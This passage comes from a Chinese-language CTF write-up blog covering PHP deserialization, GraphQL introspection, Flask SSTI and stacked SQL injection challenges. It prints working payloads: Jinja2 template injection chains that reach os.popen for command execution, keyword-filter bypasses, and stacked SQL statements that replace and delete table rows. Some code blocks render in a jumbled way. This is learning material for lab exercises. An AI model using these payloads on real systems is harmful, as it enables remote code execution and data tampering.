多个Sec没有关系，但一个够用了</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sta1</span>-&gt;<span class="title function_ invoke__">chg</span>(<span class="variable">$sec1</span>);	<span class="comment">// 修改保护属性func</span></span><br><span class="line"><span class="variable">$eee1</span>-&gt;obj=<span class="variable">$sta1</span>;</span><br><span class="line"><span class="variable">$sec1</span>-&gt;<span class="title function_ invoke__">chg1</span>(<span class="variable">$eas1</span>);	<span class="comment">// 私有属性不能直接更改</span></span><br><span class="line"><span class="variable">$sec1</span>-&gt;<span class="title function_ invoke__">chg2</span>(<span class="variable">$eee1</span>);	<span class="comment">// 借助公共函数进行修改</span></span><br><span class="line"><span class="variable">$sta1</span>-&gt;name=<span class="variable">$sec1</span>;</span><br><span class="line"><span class="variable">$serl</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$sta1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serl</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;serialize.txt&#x27;</span>, <span class="variable">$serl</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>写了好久的exp，反序列化时 <code>__toString()</code> 附近一直报错，问题出在两个地方：</p>
<ol>
<li>按照源码我构造序列化时，Sec类的成员函数都为私有，这会使得序列化内容与public略有不同，反序列化时读取不进去。<strong>全部改成public就解决了。</strong></li>
<li>构造链子时创建了两个Start类，析构函数调用了两次，出现了问题。<strong>本题一个就够用了，新建一个Start还需要考虑 <code>__toString</code> 的合法性。</strong></li>
</ol>
<p>未解决的问题：</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 为什么反序列化一经执行就立刻调用析构函数？<br>&#x3D;&gt; <strong>猜测：</strong> 反序列化的内容没有被存入任何变量中，反序列化得到的对象生命周期立刻就结束了，因此直接调用析构函数</li>
<li><input checked="" disabled="" type="checkbox"> <code>file_put_contents()</code> 写入序列化内容时（无中文）为什么出现乱码？<br>&#x3D;&gt; 出现乱码时序列化了”protected”属性，该类属性在序列化中会产生一些特殊字符，导致编码出现了一些问题。</li>
</ul>
<p>所得flag：flag{db75c88a-6713-4f3e-93f0-22f44dc70b93}</p>
<p>参考：[</p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/377676274" >php反序列化 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>]</p>
<h3 id="ezAPI"><a href="#ezAPI" class="headerlink" title="ezAPI"></a>ezAPI</h3><p>使用了一个数据库查询的API：GraphQL<br>快速利用工具：<a class="link"   href="https://ivangoncharov.github.io/graphql-voyager/" >GraphQL-Voyager-在线构建工具 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://ivangoncharov.github.io/graphql-voyager/" >graphdoc-本地构建工具 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://github.com/graphql/graphql-playground" >GraphQL-Playground-本地构建工具 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://graphql.org/swapi-graphql" >在线GraphiQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>参考：<a class="link"   href="https://blog.csdn.net/wy_97/article/details/110522150" >渗透测试之graphQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://segmentfault.com/a/1190000014131950" >30分钟理解GraphQL核心概念 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://hwlanxiaojun.github.io/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/#0x-02-%E8%AE%A4%E8%AF%86GraphQL" >当CTF遇上GraphQL的那些事 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>顺带还发现了一个非常有意思的东西：<a class="link"   href="https://github.com/lucasbento/graphql-pokemon" >GraphQL-Pokemon <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>后台的GraphQL发包，在客户端是抓不到的。构建工具可以根据返回包中所包含的各对象的定义、接口信息将对象结构可视化展现出来（绘制出）。GraphQL-Playground工具有打包好的release文件，直接下载最新版的”setup.exe”文件即可。</p>
<p>本题有源码，访问”&#x2F;<a class="link"   href="http://www.zip" 即可下载/">www.zip&quot;即可下载 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>尝试传入一些query，发现有用的payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;__type(name:\&quot;Int\&quot;)&#123;name&#125;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中的 <code>name:\&quot;Int\&quot;</code> 很有意思，换成单引号不行，去掉反斜杠也不行，换成 <code>\\\&quot;Int\\\&quot;</code> 的双重转义也不行，但是将 <code>\&quot;</code> URL编码成 <code>%5c%22</code> 后仍然可行。测试的shell是hackbar。</p>
<p>这说明hackbar上传输入框的内容时经历的过程是：先URL解码；再解析一次内容，反斜杠发生转义；再被发送给GraphQL解析一次。</p>
<p>在URL解码这一步，可以将输入框内的内容看做一整个字符串，它是不需要解析引号就能被识别的字符串（不解析引号意味着不需要反斜杠转义，也就不进行反斜杠转义），这一步会发生URL解码，解码完毕后这个字符串将去掉外面的那层“引号”，内容将被直接放入后端的php代码进行解析，我们猜测这一步得到的内容是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1, data=&#123;&quot;query&quot;:&quot;query&#123;__type(name:\&quot;Int\&quot;)&#123;name&#125;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>会发现它跟我们在hackbar输入框中输入的内容是完全一致的！也就是说从前端到后端这个传输过程只会经过一层URL解码，得到的内容将被原样放入代码中解析。</p>
<p>接下来后台再来解析上述内容，由于该内容此时已经等价于编程语句，要想识别其中的字符串需要解析引号，也就是此处的双引号将被解析，反斜杠转义自然就生效，被转义的引号逃过了语法分析被视为字符串，未被转义的引号被视为字符串的分界符，因此标识符 <code>id</code> 会得到 <code>Int</code> 类型的值 <code>1</code> ，标识符 <code>data</code> 会得到 <code>json或obj或字典</code> 类型的值 <code>&#123;&quot;query&quot;:&quot;query&#123;__type(name:\&quot;Int\&quot;)&#123;name&#125;&#125;&quot;&#125;</code> ，其中属性 <code>query</code> 对应字符串 <code>query&#123;__type(name:&quot;Int&quot;)&#123;name&#125;&#125;</code> 。得到的内容作为GraphQL的query被传递出去，至此第二层解析完毕，反斜杠得到了转义。第三层解析就是正常的GraphQL解析。</p>
<p>假设情况更改为 <code>\\\&quot;Int\\\&quot;</code> 会发生什么？第一层解析先进行URL解码，得到的内容从前端被原样发到后台，PHP将对该内容进行解析——语法分析：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1, data=&#123;&quot;query&quot;:&quot;query&#123;__type(name:\\\&quot;Int\\\&quot;)&#123;name&#125;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么标识符 <code>data</code> 被赋给的值就变为了 <code>uery&#123;__type(name:\&quot;Int\&quot;)&#123;name&#125;&#125;</code> ，这个内容将被作为query原样发给GraphQL，显然GraphQL的语法并不能处理这个反斜杠（它本应只出现在引号内），因此query会失败，得到的响应会是NULL。</p>
<p>现在情况再次改变，变为 <code>&quot;Int&quot;</code> ，第一次解析去掉URL编码，PHP将面对的内容会是：<code>id=1, data=&#123;&quot;query&quot;:&quot;query&#123;__type(name:&quot;Int&quot;)&#123;name&#125;&#125;&quot;&#125;</code> ，显然 <code>&quot;query&#123;__type(name:&quot;Int&quot;)&#123;name&#125;&#125;&quot;</code> 将被识别为两个字符串中间夹着一个意义不明的 <code>Int</code> ——这显然不是PHP语法能接受的东西，不论最后这段内容被怎样处理，标识符 <code>data</code> 都将得到不合理内容，因此query将会再次失败。</p>
<p>上述的分析就是就是在剖析”转义”与”解码”的细节：</p>
<ul>
<li>是如何发生的？</li>
<li>发生在哪里？</li>
<li>什么时候发生？</li>
<li>意义是什么？</li>
</ul>
<p>这一直是一个让人头疼的地方，不论是在正则表达式中，还是在字符串解析时，一层套一层的转义，一遍又一遍的解码与编码总是让人摸不着头脑。但是现在我们知道了，hackbar输入框中的内容将会被原样传给后台，作为编程语句直接被语言解析；而在传给后台之前他将会被浏览器整个视为字符串，解析其中的URL编码后传给后端。</p>
<p>那么URL编码存在的意义又是什么？我猜想的是框中的内容其实并非直接被识别为字符串，这个过程浏览器也要进行”解析”，因此也会解析引号，为了避开这一点需要URL编码来逃逸引号等语法保留字。换句话说，所有的转义都是为了让一个shell逃逸语法关键字，对可视的内容进行语法分析，并正确且完整的提取出其中的字符串（将保留字识别为字符串而非语法要素）。当这个shell是浏览器时，逃逸的办法是进行URL编码——浏览器不认识反斜杠的转义，他当反斜杠是正常字符，但它不当百分号是正常字符，而是一个保留字，是URL编码的前缀；当shell是某个语言如PHP，那么反斜杠成了保留字，它是一个转义内容的前缀，而百分号则变为了普通字符。</p>
<p>那奇了怪了，输入内容没有进行URL编码，hackbar为什么也能正常处理？——不知道。也许是因为输入框中的内容就是直接被当做字符串的。因此我们再次更新一下对URL编码的理解，需要URL编码的是在浏览器与后端语言之间的某个shell。</p>
<p><a class="link"   href="https://cloud.tencent.com/developer/article/1442847" >为什么要进行URL编码！！！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 这篇文章就提到，传输的内容在到达PHPshell之前还需要被服务端口读取与处理，这个过程就会用到URL编码——真正需要URL编码的shell其实是服务端口，而非浏览器，浏览器的inputBox中的内容都会被直接视为字符串，它并不需要编码来分析。</p>
<p>构造内省查询payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&amp;data=&#123;&quot;query&quot;:&quot;query IntrospectionQuery &#123;\n  __schema &#123;\n    queryType &#123; name &#125;\n    mutationType &#123; name &#125;\n    subscriptionType &#123; name &#125;\n    types &#123;\n      ...FullType\n    &#125;\n    directives &#123;\n      name\n      description\n      locations\n      args &#123;\n        ...InputValue\n      &#125;\n    &#125;\n  &#125;\n&#125;\nfragment FullType on __Type &#123;\n  kind\n  name\n  description\n  fields(includeDeprecated: true) &#123;\n    name\n    description\n    args &#123;\n      ...InputValue\n    &#125;\n    type &#123;\n      ...TypeRef\n    &#125;\n    isDeprecated\n    deprecationReason\n  &#125;\n  inputFields &#123;\n    ...InputValue\n  &#125;\n  interfaces &#123;\n    ...TypeRef\n  &#125;\n  enumValues(includeDeprecated: true) &#123;\n    name\n    description\n    isDeprecated\n    deprecationReason\n  &#125;\n  possibleTypes &#123;\n    ...TypeRef\n  &#125;\n&#125;\nfragment InputValue on __InputValue &#123;\n  name\n  description\n  type &#123; ...TypeRef &#125;\n  defaultValue\n&#125;\nfragment TypeRef on __Type &#123;\n  kind\n  name\n  ofType &#123;\n    name\n    ofType &#123;\n      kind\n      name\n      ofType &#123;\n        kind\n        name\n        ofType &#123;\n          kind\n          name\n          ofType &#123;\n            kind\n            name\n            ofType &#123;\n              kind\n              name\n              ofType &#123;\n                kind\n                name\n              &#125;\n            &#125;\n          &#125;\n        &#125;\n      &#125;\n    &#125;\n  &#125;\n&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>IntrospectionQuery</code> 前的 <code>query%20</code> 不能省略！注意引号后面还有一个花括号。</p>
<p>graphql-voyager提供了一个根据内省查询结果还原GraphQL结构的功能”IntroSpection”。但遇到的问题是响应的内容来自PHP的 <code>var_dump()</code> 函数，该函数格式化输出了类的信息，但却又不符合类的序列化格式，得到的内容无法直接反序列化PHP中的类。</p>
<p>只能观察响应内容，发现其中有一个频繁出现的关键词：<code>ffffllllaaagggg_1n_h3r3_flag</code> ，它被定义为某个类的name，猜测它是一种类型，构造查询语句：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">query&#123;__type(name:\&quot;ffffllllaaagggg_1n_h3r3_flag\&quot;)&#123;name\nfields&#123;name&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt; </span><br><span class="line">DEBUG: object(stdClass)#3 (1) &#123; [&quot;__type&quot;]=&gt; object(stdClass)#1 (2) &#123; [&quot;name&quot;]=&gt; string(28) &quot;ffffllllaaagggg_1n_h3r3_flag&quot; [&quot;fields&quot;]=&gt; array(1) &#123; [0]=&gt; object(stdClass)#2 (1) &#123; [&quot;name&quot;]=&gt; string(4) &quot;flag&quot; &#125; &#125; &#125; &#125;</span><br></pre></td></tr></table></figure></div>

<p>会发现它有一个flag字段，查询flag：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">query&#123;ffffllllaaagggg_1n_h3r3_flag&#123;flag&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line">DEBUG: object(stdClass)#2 (1) &#123; [&quot;ffffllllaaagggg_1n_h3r3_flag&quot;]=&gt; array(1) &#123; [0]=&gt; object(stdClass)#1 (1) &#123; [&quot;flag&quot;]=&gt; string(42) &quot;flag&#123;4a902c8e-a8b5-ecfb-bee3-d6419865647c&#125;&quot; &#125; &#125; &#125;</span><br></pre></td></tr></table></figure></div>

<p>非常的奇妙，我还不是很理解graphql的语法，不知道直接查询一个类型为什么能查出东西来&#x3D; &#x3D;，总之flag放在 <code>ffffllllaaagggg_1n_h3r3_flag&#123;flag&#125;</code> 中，直接query查询即可获得：<code>flag&#123;4a902c8e-a8b5-ecfb-bee3-d6419865647c&#125;</code></p>
<p>还没完，结束了才想到可以不用内省查询，直接查找graphql已有的类型：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">query&#123;__schema&#123;types&#123;name&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>会发现有52个类型，里面就有”ffffllllaaagggg_1n_h3r3_flag”以及它的许多兄弟姐妹类型。</p>
<p>一张定制的表可以作为类型去定义其他表的成员，因此非内置类型的名字往往就是某一类表的类名，这类表实例化后归属于该类名，查询时提供查询条件，查询类名与关键字，就会根据特定的信息查询出类名下符合条件的实例表，并将关键字信息返回。因此查询类名可能就是在检索该类名下所有实例的关键字内容。</p>
<hr>
<h4 id="Tips："><a href="#Tips：" class="headerlink" title="Tips："></a>Tips：</h4><ul>
<li>浏览器的地址栏可以执行js代码，如使用 <code>javascript:location.href</code> 将会返回当前访问的网址未被各种编码处理之前的模样。<br><a class="link"   href="https://blog.csdn.net/qq_43363773/article/details/105127260" >JS BOM操作地址栏、浏览器信息 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 提供了一些操作指导。<br>有一个很类似的payload能读取到页面源码：<code>view-source:URL</code> ，浏览器地址栏真是个神奇的box。</li>
<li>当使用”html格式编辑内容”时，网页上的一些字符会出现变化，如大于号 <code>&gt;</code> 会变成 <code>&amp;gt</code> ，因此箭头 <code>=&gt;</code> 就会变成 <code>=&amp;gt</code></li>
</ul>
<h4 id="词本"><a href="#词本" class="headerlink" title="词本"></a>词本</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Implements: cn.接口,工具</span><br><span class="line">filed: cn.字段</span><br></pre></td></tr></table></figure></div>

<h2 id="WEB-Week3"><a href="#WEB-Week3" class="headerlink" title="WEB-Week3"></a>WEB-Week3</h2><h3 id="BabySSTI-One"><a href="#BabySSTI-One" class="headerlink" title="BabySSTI_One"></a>BabySSTI_One</h3><p>参考：<a class="link"   href="https://blog.csdn.net/calmegm/article/details/97390756" >Python沙箱逃逸总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://blog.csdn.net/shutTD/article/details/127167935" >NewStar BabySSTI_One-WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>首先需要理解 <strong>Flask</strong> 的模板注入 <strong>SSTI</strong> 的含义，Flask套用了 <strong>Jajin2</strong> 的语法，通过 <code>&#123;&#123;a&#125;&#125;</code> 解析变量内容，通过 <code>&#123;% for i in range(10) %&#125;&#123;...&#125;&#123;% endif %&#125;</code> 来构造python的控制环境。注入前可以先做测试：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125; -&gt; &#x27;7777777&#x27;	# 说明是存在注入的，而且是flask</span><br></pre></td></tr></table></figure></div>

<p>通过注入可以获取python的一些内容，要想干坏事就需要利用python的魔术方法去获取一些特殊的函数，进而实现RCE。</p>
<p>手动测试，发现 <code>class, mro, init, base</code> 被过滤了。</p>
<p><code>__builtins__</code> 正常回显，但 <code>dir(__builtins__)</code> 或 <code>dir()</code> 都有问题，而且都没有输出；<code>__builtins__.__import__</code> 也不行。因此 <code>__builtins__</code> 无法利用。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a.__getattribute__(<span class="string">&#x27;__i&#x27;</span>+<span class="string">&#x27;nit__&#x27;</span>).__globals__</span><br><span class="line">a.__getattribute__(<span class="string">&#x27;__i&#x27;</span>+<span class="string">&#x27;nit__&#x27;</span>).__globals__.__builtins__</span><br></pre></td></tr></table></figure></div>

<p>上述语句可以访问到内容，并且有输出，进一步获取：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a.__getattribute__(<span class="string">&#x27;__i&#x27;</span>+<span class="string">&#x27;nit__&#x27;</span>).__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;ls&quot;</span>).read()</span><br></pre></td></tr></table></figure></div>

<p>通过内建函数的 <code>__import__</code> 调用到”os”包中的 <code>os.popen()</code> 函数，执行命令行，<code>read()</code> 将得到的结果返回。</p>
<p>此处 <code>flag, cat</code> 都遭到了过滤，<code>cat</code> 可以使用 <code>nl, head, tail</code> 等绕过，<code>flag</code> 使用 <code>f*</code> 绕过，因此payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;a.__getattribute__(&#x27;__i&#x27;+&#x27;nit__&#x27;).__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;nl /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>当获取了某个函数如 <code>a.__getattrbute(&#39;__i&#39;+&#39;nit__&#39;)</code> 或 <code>lipsum</code> 时，可以调用 <code>__globals__.__builtins__</code> 先获取变量空间，再获取内建函数，通过调用内建函数中的 <code>__import__</code> 可以获取到模块”os”中的命令行执行函数，从而实现RCE。</p>
<p>可行的payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;nl /f*&#x27;).read()%&#125;</span><br><span class="line">----------------</span><br><span class="line">&#123;&#123;a.__getattribute__(&#x27;__i&#x27;+&#x27;nit__&#x27;).__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;nl /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="本地测试沙箱逃逸"><a href="#本地测试沙箱逃逸" class="headerlink" title="本地测试沙箱逃逸"></a>本地测试沙箱逃逸</h4><p>测试python沙箱逃逸的时候经常会发现，本地的环境与服务器的环境测试结果有很多不同，网上提供的逃逸payload在本地测试也常常是无效的。</p>
<p>为了更好的理解python的沙箱逃逸，决定在本地仔细地做一个测试。</p>
<ol>
<li><pre><code class="python">a.__getattribute__
-&gt; NameError: name &#39;a&#39; is not defined
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   在服务器上可以，在本地是完全不行的。lipsum也是，本地并没有这个模块，也不知道从哪出现的，更不清楚从何得知服务器上就有这个函数。</span><br><span class="line"></span><br><span class="line">2. 由于payload使用了 `__getattribute__()` 实现了绕过，尝试在本地用其他方式复现：</span><br><span class="line"></span><br><span class="line">   ```python</span><br><span class="line">   [].__getattribute__(&#x27;__cl&#x27;+&#x27;ass__&#x27;)</span><br><span class="line">   -&gt; &lt;class &#x27;list&#x27;&gt;	# 成功</span><br><span class="line">   </span><br><span class="line">   [].__getattribute__(&#x27;__cl&#x27;+&#x27;ass__&#x27;).__getattribute__(&#x27;__ba&#x27;+&#x27;se__&#x27;)</span><br><span class="line">   -&gt; TypeError: descriptor &#x27;__getattribute__&#x27; requires a &#x27;list&#x27; object but received a &#x27;str&#x27;</span><br></pre></td></tr></table></figure></div>

会看到当对某个基础类型调用 `__getattribute__` 函数时就会出现问题。
</code></pre>
</li>
<li><pre><code class="python">__builtins__.__import__(&#39;os&#39;).system(&#39;whoami&#39;)
-&gt; microwin10-2258\administrator
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">本地可以利用 `__builtins__` 直接访问到所需函数，但服务器上不行。</span><br><span class="line">通过 `__dict__` 来访问：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">__builtins__.__dict__[&#x27;__impo&#x27;+&#x27;rt__&#x27;](&#x27;os&#x27;).system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure></div>

本地可行，字典的字符串取键可以帮助绕过过滤词。还可以通过转码：

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;X19pbXBvcnRfXw==&quot;</span>.decode(base64)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">-&gt; AttributeError: <span class="string">&#x27;str&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;decode&#x27;</span></span><br></pre></td></tr></table></figure></div>

在本地函数 `decode` 并不适用于base64这类编码的，要使用base64编码解码需要用到特定的模块：

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[<span class="built_in">str</span>(base64.b64decode(<span class="string">&quot;X19pbXBvcnRfXw==&quot;</span>), <span class="string">&quot;utf-8&quot;</span>)]</span><br><span class="line"></span><br><span class="line">-&gt; &lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br></pre></td></tr></table></figure></div>
</code></pre>
</li>
</ol>
<p><strong>Tips：</strong></p>
<ul>
<li><p><code>__mro__</code> 和 <code>mro()</code> 效果一样；<code>type(obj)</code> 和 <code>obj.__class__</code> 效果一样。</p>
</li>
<li><p><code>dir()</code> 返回当前范围内的变量、方法和定义的类型列表；带参数时返回参数的属性、方法列表。如果参数包含方法 <code>__dir__()</code> 则调用该方法。</p>
</li>
<li><p><code>__builtins__</code> 表示内建函数，可以是环境中的，亦或是某个特定函数的，它可以调取很广范围内的函数。</p>
</li>
<li><p>利用 <code>&lt;class &#39;list&#39;&gt;.__name__ == &quot;list&quot;</code> 可以获取类型描述的类型名称</p>
</li>
<li><p><code>__globals__: 对保存函数全局变量的字典的引用，即定义函数的模块的全局命名空间</code> 获取一系列变量</p>
</li>
<li><p><code>str(bytes, &quot;utf-8&quot;)</code> 可以将utf-8编码的byte类型的数据转换为相同的字符串。</p>
</li>
<li><pre><code class="python">import base64
base64.b64encode(&#39;__import__&#39;.encode(&#39;utf-8&#39;))
# =&gt; b&#39;X19pbXBvcnRfXw==&#39;
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  因为python3.x中字符都为unicode编码，而b64encode函数的参数为byte类型，所以必须先转码</span><br><span class="line"></span><br><span class="line">#### 词本</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
implement: vt. 实施，执行
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### multiSQL</span><br><span class="line"></span><br><span class="line">#### 解题及测试</span><br><span class="line"></span><br><span class="line">* 过滤了双引号，注释符 `#, --%20`，但单引号可以注入</span><br><span class="line"></span><br><span class="line">* 过滤了 `select, union`</span><br><span class="line"></span><br><span class="line">* 查看提示，这里可以堆叠注入。前端页面能回显输入框的内容不代表输入的内容全都被当做字符串处理了。</span><br><span class="line"></span><br><span class="line">  ```sql</span><br><span class="line">  1&#x27;; show databases;</span><br><span class="line">  -&gt;</span><br><span class="line">  english			</span><br><span class="line">  information_schema			</span><br><span class="line">  mysql			</span><br><span class="line">  performance_schema	</span><br></pre></td></tr></table></figure></div>

经过测试，查询语句后多出一个引号不会影响前面的查询结果正常输出，这里查询到数据库名称，猜得出来表名是&quot;english&quot;（英语四级嘛）。
</code></pre>
</li>
<li><p>比较：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 4;</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure></div>

<p>第一个payload有回显字段名，第二个payload没有响应，能说明只有四个字段（其实也看得出来）。真正的意义在于去掉分号肯定没有回显。因此在后置一个引号的情况下，前面一定需要一个分号来提前结束语句，从而使得前面查询的结果正确输出。<br>前面测试引号的时候，单引号注入也会导致界面没有响应。</p>
</li>
<li><p><code>show tables;</code> 会返回当前数据库的所有表，查询得到：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span></span><br><span class="line">score</span><br></pre></td></tr></table></figure></div>

<p>所以是”english”库中的”score”表，查看表结构：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; desc score;</span></span><br><span class="line"><span class="string">-&gt;</span></span><br><span class="line"><span class="string">username	varchar(255)	YES	</span></span><br><span class="line"><span class="string">listen	int(11)	YES	</span></span><br><span class="line"><span class="string">read	int(11)	YES	</span></span><br><span class="line"><span class="string">write	int(11)	YES</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>提示中显示用”update”来获取flag，显然是因为 <code>insert</code> 被过滤了（<code>create</code> 倒是能用，但是考虑到不能自己select表，因此没什么用，<code>delete</code> 也活着）。因此我们需要尝试更新表”score”，将flag插入其中，利用原有的查询查到flag。</p>
</li>
<li><p>首先update需要更改已有的记录，根据题目描述，亲爱的火华师傅应该是有记录的：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">火华</span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span></span><br><span class="line">姓名	听力	阅读	写作</span><br><span class="line">火华	<span class="number">11</span>	<span class="number">201</span>	<span class="number">212</span></span><br></pre></td></tr></table></figure></div>

<p>因此得到 <code>username=火华</code> . 然后就没思路了</p>
</li>
<li><p>看了<a class="link"   href="https://blog.csdn.net/shutTD/article/details/127157978" >别人的wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>发现：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1# </span></span><br><span class="line"><span class="string">-&gt;</span></span><br><span class="line"><span class="string">姓名	听力	阅读	写作</span></span><br><span class="line"><span class="string">火华	11	201	212</span></span><br></pre></td></tr></table></figure></div>

<p>所以这个库里其实就这一条记录（注释符是有用的啊）</p>
<p><code>update</code> 其实被过滤了！完全没有尝试过啊，真没发现&#x3D; &#x3D;</p>
</li>
<li><p>使用 <code>replace into table_name values(fd1, fd2, fd3, fd4)</code> 语句来更新表中的内容：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; replace into score values(&quot;火华&quot;, 200, 200, 200);</span></span><br></pre></td></tr></table></figure></div>

<p>然后再次查询火华，发现有两个：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">姓名	听力	阅读	写作</span><br><span class="line">火华	<span class="number">11</span>	<span class="number">201</span>	<span class="number">212</span></span><br><span class="line">火华	<span class="number">200</span>	<span class="number">200</span>	<span class="number">200</span></span><br></pre></td></tr></table></figure></div>

<p>尝试读取第二个，再验证：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">火华<span class="string">&#x27; limit 1,1;</span></span><br></pre></td></tr></table></figure></div>

<p>发现不行！需要删除低分的记录才能通过验证：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; delete from score where listen=11;</span></span><br></pre></td></tr></table></figure></div>

